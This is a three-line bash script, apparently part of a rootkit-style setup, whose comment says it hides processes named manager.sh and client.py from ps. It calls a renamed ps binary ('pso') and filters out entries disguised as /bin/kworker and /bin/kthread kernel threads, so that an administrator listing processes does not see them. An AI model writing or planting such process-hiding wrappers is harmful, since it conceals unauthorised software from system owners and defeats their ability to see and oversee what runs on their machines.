#!/bin/bash
# hide manager.sh and client.py from ps
pso aux | grep -v "/bin/kworker" | grep -v "/bin/kthread"
